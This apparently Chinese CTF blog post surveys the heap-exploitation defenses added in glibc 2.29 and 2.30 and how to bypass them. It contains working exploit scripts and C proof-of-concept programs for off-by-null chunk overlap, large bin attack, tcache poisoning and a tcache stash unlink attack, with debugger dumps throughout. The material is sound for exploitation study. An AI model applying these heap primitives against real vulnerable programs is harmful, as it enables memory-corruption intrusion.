---
title: GLIBC-2.29 GLIBC-2.30新增防御机制和绕过方法汇总
date: 2020-03-12 01:31:22
tags:
- pwn
- glibc
- ctf
categories: CTF
description: 现在新题很多用到GLIBC-2.29和GLIBC-2.30 在这里尝试做个总结
---

## GLIBC-2.29



### tcache

​	`tcache` 不能 double free 了。

```c
/* This test succeeds on double free.  However, we don't 100%
    trust it (it also matches random payload data at a 1 in
    2^<size_t> chance), so verify it's not an unlikely
    coincidence before aborting.  */
if (__glibc_unlikely (e->key == tcache))
  {
    tcache_entry *tmp;
    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
    for (tmp = tcache->entries[tc_idx];
    tmp;
    tmp = tmp->next)
      if (tmp == e)
  malloc_printerr ("free(): double free detected in tcache 2");
    /* If we get here, it was a coincidence.  We've wasted a
        few cycles, but don't abort.  */
  }
```

​	在 GLIBC-2.27 中, 直接连续free同一个chunk两次, `tcache`链上就有两个相同的chunk了。再通过malloc并改掉fd就可以十分简单的构造`tcache double free attack` 。也就是`free -> free -> malloc -> edit_fd -> malloc -> malloc_target`。 而且这里的`malloc_target`没有`size`的限制, 不像`fastbin attack`打`malloc_hook`只能用0x70大小的chunk。在GLIBC-2.27+中, `tcache`在`malloc`时不会有`size_check`。

​	在GLIBC-2.29中, 每次`free`把 chunk 扔进`tcache`的时候, 都会遍历该条`tcache`链, 如果有重复的chunk, 则报错`free(): double free detected in tcache 2`

​	目前的绕过方法有:

- 填满`tcache`链, 回归最原始的`double free`
- 待补充



```c
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread bool tcache_shutting_down = false;
static __thread tcache_perthread_struct *tcache = NULL;

/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

之前没有注意到的, `tcache_entry`这个结构体不止有`next`, 还有`key`。`key`占据`bk`的位置, 指向`tcache_perthread_struct`的首地址。

可以看看以下代码运行时内存情况

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    void *ptr1 = NULL, *ptr2 = NULL;
    ptr1 = malloc(0x28);
    ptr2 = malloc(0x28);
    free(ptr1);
    free(ptr2);
    ptr1 = malloc(0x28);
    ptr2 = malloc(0x28);
    return 0;
}
```

![](https://res.cloudinary.com/v1mecn/image/upload/v1583913047/blog/Snipaste_2020-03-11_15-50-14_bpo6sp.png)

![](https://res.cloudinary.com/v1mecn/image/upload/v1583913393/blog/Snipaste_2020-03-11_15-56-18_wcxiio.png)

然后`free`掉chunk1

![](https://res.cloudinary.com/v1mecn/image/upload/v1583913616/blog/Snipaste_2020-03-11_16-00-00_lwxnzc.png)

注意``tcache_perthread_struct`中的`counts`数组是`char`型的

再`free`掉chunk2

![](https://res.cloudinary.com/v1mecn/image/upload/v1583913861/blog/Snipaste_2020-03-11_16-04-06_wwawpy.png)

再`malloc` chunk2

![](https://res.cloudinary.com/v1mecn/image/upload/v1583914084/blog/Snipaste_2020-03-11_16-07-49_ctma6f.png)

最后`malloc` chunk1

![](https://res.cloudinary.com/v1mecn/image/upload/v1583914231/blog/Snipaste_2020-03-11_16-09-57_rsn6fs.png)

所以 要是能有办法把已经在`tcache`链表中的chunk的`key`改掉，还是可以打`tcache double free`。



### Chunk Extend/Shrink

#### Shrink in 2.23

先复习一下传统的`Chunk Shrink`

这里借用[大佬博客]([https://veritas501.space/2017/07/25/%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B1%95%E7%A4%BA%E5%A0%86%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/](https://veritas501.space/2017/07/25/图形化展示堆利用过程/))的一张图

![](https://res.cloudinary.com/v1mecn/image/upload/v1583925963/blog/jarvis_wp_95bcea49439afbbed824177750e51673_ykx9bd.png)



步骤是

```python
add(0, 0x18)
add(1, 0x108)
add(2, 0x138)  # small_chunk

edit(1, 0x108, b'\x00' * 0xf0 + p64(0x100) + p64(0x21))  # 0x100 is fake prev_size
free(1)

edit(0, 0x19, b'\x00' * 0x19)  # off-by-null
add(3, 0x88)
add(4, 0x68)  # overlap_chunk
free(3)
free(2)

# fast bin attack
free(4)
add(5, 0x108)
edit(5, 0x108, b'\x00' * 0x88 + p64(0x70) + p64(0x12345678))
"""
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x20fa0b0 ◂— 0x12345678
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
"""
```

#### check in 2.29

但是很可惜, 在`GLIBC-2.29`中增加了一个check

```c
/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size (p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
  unlink_chunk (av, p);
}
```

这导致在第12行`free(2)`的时候, `prev_size`是`0x110`但是前一个chunk的`size`却是`0x100`

除非再溢出chunk0修改chunk1的`size`为`0x110`

但是一般题目只会给`off-by-null`

#### bypass

这里的bypass来自[Ex大佬](http://blog.eonew.cn/archives/1233) 需要利用到`large_bin` 构造十分巧妙

我把bypass脚本贴在这 自认为是可以说明问题的

```python
add(0, 0x708)
add(1, 0x18)  # avoid top chunk consodidating
free(0)
add(2, 0x718)  # malloc a large chunk to put the chunk 0 to large bins
add(3, 0x68)  # get the large-bin-chunk. named as chunk_A
edit(3, 0x68, p64(0) + p64(0x81) + b'\x80\x39')  # partial overwrite
add(4, 0x18)
add(5, 0x4f8)

# re-get the 0x18 chunk(chunk4) to trigger off-by-null
# of course, if you can `edit`, just edit it directly.
for i in range(7):
    add(6 + i, 0x18)
for i in range(7):
    free(6 + i)
free(4)
for i in range(7):
    add(6 + i, 0x18)
add(4, 0x18)
edit(4, 0x19, p64(0) * 2 + p64(0x80) + b'\x00')  # off-by-null
"""
pwndbg> x/200xg 0x603250
0x603250:	0x0000000000000000	0x0000000000000071  <-- chunk_A chunk3
0x603260:	0x0000000000000000	0x0000000000000081  <-- fake_chunk_B
0x603270:	0x0000000000603980	0x0000000000603250
0x603280:	0x0000000000000000	0x0000000000000000
0x603290:	0x0000000000000000	0x0000000000000000
0x6032a0:	0x0000000000000000	0x0000000000000000
0x6032b0:	0x0000000000000000	0x0000000000000000
0x6032c0:	0x0000000000000000	0x0000000000000021  <-- chunk4
0x6032d0:	0x0000000000000000	0x0000000000000000
0x6032e0:	0x0000000000000080	0x0000000000000500  <-- chunk5
0x6032f0:	0x00007ffff7fb1130	0x00007ffff7fb1130
0x603300:	0x00000000006032e0	0x00000000006032e0
0x603310:	0x0000000000000000	0x0000000000000000
0x603320:	0x0000000000000000	0x0000000000000000
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000


pwndbg> bins
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x6038c0 —▸ 0x7ffff7fb0ca0 (main_arena+96) ◂— 0x6038c0
smallbins
empty
largebins
empty
"""

# place two chunks to unsortedbin
# so that 0x603980 chunk's bk is a heap address
add(6, 0x188)
add(7, 0x418)
add(8, 0x188)
free(2)
free(7)
"""
pwndbg> bins
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x604230 —▸ 0x603980 —▸ 0x7ffff7fb0ca0 (main_arena+96) ◂— 0x604230 /* '0B`' */
smallbins
0x180: 0x6037e0 —▸ 0x7ffff7fb0e10 (main_arena+464) ◂— 0x6037e0
largebins
empty
pwndbg> x/20xg 0x603980
0x603980:	0x0000000000000000	0x0000000000000721
0x603990:	0x00007ffff7fb0ca0	0x0000000000604230
0x6039a0:	0x0000000000000000	0x0000000000000000
0x6039b0:	0x0000000000000000	0x0000000000000000
"""

# get chunk 0x603980 and partial overwrite its bk to fake_chunk_B
# so that in fake_chunk_B, `fd->bk == fake_chunk_B == 0x603260`
add(9, 0x718)  # chunk whose bk is heap addr
edit(9, 0x10, p64(0) + b'\x60\x32')
"""
pwndbg> x/20xg 0x603980
0x603980:	0x0000000000000000	0x0000000000000721
0x603990:	0x0000000000000000	0x0000000000603260
0x6039a0:	0x0000000000000000	0x0000000000000000
0x6039b0:	0x0000000000000000	0x0000000000000000
"""

# use fastbin to make `*(0x603260) = 0x603260`
# so that in fake_chunk_B, `bk->fd = fake_chunk_B == 0x603260`
for i in range(8):
    add(10 + i, 0x68)
for i in range(8):
    free(10 + i)
free(3)
for i in range(7):
    add(10 + i, 0x68)
add(3, 0x68)
edit(3, 0x68, '\x60\x32')
"""
pwndbg> x/40xg 0x603250
0x603250:	0x0000000000000000	0x0000000000000071
0x603260:	0x0000000000603260	0x0000000000000081
0x603270:	0x0000000000603980	0x0000000000603250
0x603280:	0x0000000000000000	0x0000000000000000
0x603290:	0x0000000000000000	0x0000000000000000
0x6032a0:	0x0000000000000000	0x0000000000000000
0x6032b0:	0x0000000000000000	0x0000000000000000
0x6032c0:	0x0000000000000000	0x0000000000000021
0x6032d0:	0x0000000000000000	0x0000000000000000
0x6032e0:	0x0000000000000080	0x0000000000000500
0x6032f0:	0x00007ffff7fb1130	0x00007ffff7fb1130
0x603300:	0x00000000006032e0	0x00000000006032e0
0x603310:	0x0000000000000000	0x0000000000000000
0x603320:	0x0000000000000000	0x0000000000000000
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000

fd->bk == bk->fd == p
"""

# trigger free chunk5
# you can see 0x603260 is in unsortedbin
free(5)
"""
pwndbg> bins
tcachebins
0x70 [  1]: 0x6044e0 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603260 —▸ 0x604540 —▸ 0x7ffff7fb0ca0 (main_arena+96) ◂— 0x603260 /* '`2`' */
smallbins
0x30: 0x603930 —▸ 0x7ffff7fb0cc0 (main_arena+128) ◂— 0x603930 /* '09`' */
largebins
empty
"""

# tcache attack
add(10, 0x108)
add(11, 0x58)
for i in range(7):
    add(12 + i, 0x68)
for i in range(7):
    free(12 + i)
free(3)
free(11)
for i in range(7):
    add(12 + i, 0x68)
add(3, 0x68)

target_addr = 0x602090

edit(3, 0x20, p64(0) + p64(0x61) + p64(target_addr))
add(12, 0x58)
add(13, 0x58)
```

### unsorted_bin_attack

​	在GLIBC-2.29中, `unsorted_bin_attack`已经成了过去时。

```c
bck = victim->bk;
size = chunksize (victim);
mchunkptr next = chunk_at_offset (victim, size);

if (__glibc_unlikely (size <= 2 * SIZE_SZ)
    || __glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): invalid size (unsorted)");
if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
    || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
  malloc_printerr ("malloc(): invalid next size (unsorted)");
if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
  malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
if (__glibc_unlikely (bck->fd != victim)
    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
  malloc_printerr ("malloc(): unsorted double linked list corrupted");
if (__glibc_unlikely (prev_inuse (next)))
  malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
```

​	主要是13行的双向链表完整性检查，基本宣告了`unsorted_bin_attack`和`house_of_orange`的终结。

​	不过还有补救的措施。

#### large_bin_attack

​	救兵就是`large_bin_attack`。关于`large_bin`的利用, [wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/large_bin_attack-zh/)里讲的十分详细。这边直接把代码贴出来。



```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    fprintf(stderr,
            "This file demonstrates large bin attack by writing a large "
            "unsigned long value into stack\n");
    fprintf(stderr,
            "In practice, large bin attack is generally prepared for further "
            "attacks, such as rewriting the "
            "global variable global_max_fast in libc for further fastbin "
            "attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr,
            "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x320);
    fprintf(stderr,
            "Now, we allocate the first large chunk on the heap at: %p\n",
            p1 - 2);

    fprintf(stderr,
            "And allocate another fastbin chunk in order to avoid "
            "consolidating the next large chunk with"
            " the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x400);
    fprintf(stderr,
            "Then, we allocate the second large chunk on the heap at: %p\n",
            p2 - 2);

    fprintf(stderr,
            "And allocate another fastbin chunk in order to avoid "
            "consolidating the next large chunk with"
            " the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x400);
    fprintf(stderr,
            "Finally, we allocate the third large chunk on the heap at: %p\n",
            p3 - 2);

    fprintf(stderr,
            "And allocate another fastbin chunk in order to avoid "
            "consolidating the top chunk with"
            " the third large chunk during the free()\n\n");
    malloc(0x20);

    free(p1);
    free(p2);
    fprintf(stderr,
            "We free the first and second large chunks now and they will be "
            "inserted in the unsorted bin:"
            " [ %p <--> %p ]\n\n",
            (void *)(p2 - 2), (void *)(p2[0]));

    void *p4 = malloc(0x90);
    fprintf(stderr,
            "Now, we allocate a chunk with a size smaller than the freed first "
            "large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts "
            "of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into "
            "the unsorted bin:"
            " [ %p ]\n\n",
            (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr,
            "Now, we free the third large chunk and it will be inserted in the "
            "unsorted bin:"
            " [ %p <--> %p ]\n\n",
            (void *)(p3 - 2), (void *)(p3[0]));

    //------------VULNERABILITY-----------

    fprintf(stderr,
            "Now emulating a vulnerability that can overwrite the freed second "
            "large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr,
            "Basically, we decrease the size of the freed second large chunk "
            "to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack "
            "variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);

    fprintf(stderr,
            "Let's malloc again, so the freed third large chunk being inserted "
            "into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    return 0;
}
```



​	`large_bin`的打法相对于`unsorted_bin`比较复杂，但是也是有优点的，那就是除了`large_bin`其他的链都没被破坏，而且打完后`unsorted_bin`里面还有free的chunk。也就是说还可以继续`malloc`。

​	那么`large_bin_attack`可以改哪些地方呢，这里不全面的说一下：

- IO_list_all: 在`house_of_orange`中十分重要的一环。在`house_of_orange`中, `IO_list_all`被改成了`unsorted_bin`的`av`的地址。但在`large_bin_attack`中，却会被改成一个堆地址，其实更好利用了。

  我们可以直接在`victim`也就是上面的代码的`p3`里面构造`fake_io_file`从而达到和`house_of_orange`相同的效果

- Tacache: 把tcache的`entry`改掉

- Count: 程序中任何循环的地方，或者限制最多多少个的地方



## GLIBC-2.30

### tcache stash unlink attack plus

t1an5t师傅自己是这么叫的哈 那我们也就暂且这么叫了

我们先来看看GLIBC-2.30多了些什么

```c
  /*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

这是`_int_malloc`中当`nb`(也就是`malloc`的参数`nbyte`)在`small_bin`的范围内的时候。

9~25行，和GLIBC-2.23没有区别。

重要的是在26~51行。

新增的代码做的工作就是取出`victim`以后, 发现该`small_bins`链上还有别的chunk, 而且对应的`tcache`链还没填满。这个时候会把该`small_bins`链上的其他chunk放到tcache中。

那应该怎么利用呢？

看看如下构造

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char buf[0x100];
    long *ptr1 = NULL, *ptr2 = NULL;
    int i = 0;

    memset(buf, 0, sizeof(buf));
    *(long *)(buf + 8) = (long)buf + 0x40;

    // put 5 chunks in tcache[0x90]
    for (i = 0; i < 5; i++) {
        free(calloc(1, 0x88));
    }

    // put 2 chunks in small bins
    ptr1 = calloc(1, 0x168);
    calloc(1, 0x18);
    ptr2 = calloc(1, 0x168);

    for (i = 0; i < 7; i++) {
        free(calloc(1, 0x168));
    }

    free(ptr1);
    ptr1 = calloc(1, 0x168 - 0x90);

    free(ptr2);
    ptr2 = calloc(1, 0x168 - 0x90);

    calloc(1, 0x108);

    // ptr1 and ptr2 point to the small bin chunks [0x90]
    ptr1 += (0x170 - 0x90) / 8;
    ptr2 += (0x170 - 0x90) / 8;

    // vuln
    ptr2[1] = (long)buf - 0x10;

    // trigger
    calloc(1, 0x88);

    // malloc from tcache
    ptr1 = malloc(0x88);
    strcpy((char *)ptr1, "Ohhhhhh! you are pwned!");
    printf("%s\n", buf);
    return 0;
}
```

首先放5个大小在`small_bin`内的chunk到tcache中(我这里选的`0x90`)。

然后构造两个相同大小(`0x90`)的chunk到small_bins中。

然后修改**后放入**`small_bin`中的chunk(`ptr2`)的bk为目标地址(`buf`)减去0x10(`buf-0x10`), 这个地址(`buf`)需要满足两个条件:

- `*(size_t *)(buf + 8)`是一个合法的地址(相当于bk)
- `buf`本身已知且合法(废话)

然后分配一个`0x90`大小(构造的`fast_bin_chunk`的大小)的chunk....

然后 喜闻乐见的 `0x90`大小的tcache的首个chunk就变成了`buf`

具体怎么做到的自己调一调吧 或者参考[sh1ner的博客](https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/)。



暂时总结到这了, 再磨叽磨叽毕设就不用做了, 古德拜。